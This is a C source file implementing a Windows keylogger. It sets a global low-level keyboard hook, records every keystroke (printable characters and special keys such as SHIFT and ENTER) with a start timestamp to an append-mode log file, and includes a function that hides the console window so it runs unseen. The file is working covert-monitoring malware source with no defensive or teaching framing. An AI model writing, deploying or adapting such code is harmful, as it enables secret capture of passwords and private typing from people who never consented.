#include <Windows.h>
#include <stdio.h>
#include <time.h>

#include "keyLogger.h"

#define MAX_TIME_STR_LEN 30

#define VK_A 0x41
#define VK_Z 0x5A

#define VK_0 0x30 
#define VK_9 0x39

HHOOK hKeyboardHook;

FILE *outFile;


void hideConsoleWindow(void)
{
    const HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
    }
}


void logToOutFile(const char *format, ...) {
    va_list args;
    va_start(args, format);

    vfprintf_s(outFile, format, args);
    fflush(outFile);

    va_end(args);
}


void logCurrentTime(void)
{
    struct tm newtime;
    time_t now = time(0);
    localtime_s(&newtime, &now);

    char timeString[MAX_TIME_STR_LEN];
    asctime_s(timeString, sizeof timeString, &newtime);

    logToOutFile("\n\nStart logging at: %s", timeString);
}


const char *getSpecialKeyName(DWORD vkCode) {
    switch (vkCode) {
        case VK_SHIFT:
            return "SHIFT";
        case VK_CONTROL:
            return "CTRL";
        case VK_MENU:
            return "ALT";
        case VK_LWIN:
            return "LEFT WINDOWS";
        case VK_RWIN:
            return "RIGHT WINDOWS";
        case VK_CAPITAL:
            return "CAPS LOCK";
        case VK_NUMLOCK:
            return "NUM LOCK";
        case VK_SCROLL:
            return "SCROLL LOCK";
        case VK_ESCAPE:
            return "ESCAPE";
        case VK_TAB:
            return "TAB";
        case VK_RETURN:
            return "ENTER";
        case VK_BACK:
            return "BACKSPACE";
        case VK_PRIOR:
            return "PAGE UP";
        case VK_NEXT:
            return "PAGE DOWN";
        case VK_END:
            return "END";
        case VK_HOME:
            return "HOME";
        case VK_INSERT:
            return "INSERT";
        case VK_DELETE:
            return "DELETE";
        case VK_PAUSE:
            return "PAUSE";
        case VK_PRINT:
            return "PRINT SCREEN";
        case VK_SNAPSHOT:
            return "SNAPSHOT";
        case VK_LEFT:
            return "LEFT ARROW";
        case VK_UP:
            return "UP ARROW";
        case VK_RIGHT:
            return "RIGHT ARROW";
        case VK_DOWN:
            return "DOWN ARROW";

        default:
            return NULL; 
    }
}


const char getCharFromVKCode(DWORD vkCode) {
    if ((vkCode == VK_SPACE) ||
        (vkCode >= VK_0 && vkCode <= VK_9) ||
        (vkCode >= VK_A && vkCode <= VK_Z)) {
        return (char)vkCode;
    }
    
    switch (vkCode) {
        case VK_OEM_1:      return ';';
        case VK_OEM_PLUS:   return '=';
        case VK_OEM_COMMA:  return ',';
        case VK_OEM_MINUS:  return '-';
        case VK_OEM_PERIOD: return '.';
        case VK_OEM_2:      return '/';
        case VK_OEM_3:      return '`';
        case VK_OEM_4:      return '[';
        case VK_OEM_5:      return '\\';
        case VK_OEM_6:      return ']';
        case VK_OEM_7:      return '\'';
        default:            return '\0';
    }    
}


void onKeyPressed(const DWORD vkCode)
{
    const char character = getCharFromVKCode(vkCode);
    if (character) {
        logToOutFile("%c", character);
        return;
    }

    const char *specialKeyName = getSpecialKeyName(vkCode);
    if (specialKeyName) {
        logToOutFile("(%s)", specialKeyName);
        return;
    }
    logToOutFile("(%u)", vkCode);
}


LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = kbStruct->vkCode;
            onKeyPressed(vkCode);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}


const HHOOK setHook(void)
{
    return SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
}


const errno_t setupKeyLogger(const char *outFileName) {
    const errno_t fileErr = fopen_s(&outFile, outFileName, "a");
    if (fileErr) return fileErr; 

    hKeyboardHook = setHook();
    if (hKeyboardHook == NULL) return SET_HOOK_ERROR;

    return 0;
}


void startLogging(void)
{
    logCurrentTime();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


const errno_t logKeys(const char *outFileName)
{
    const errno_t err = setupKeyLogger(outFileName);
    if (err) return err;

    startLogging();

    UnhookWindowsHookEx(hKeyboardHook); 
    fclose(outFile);

    return 0;
}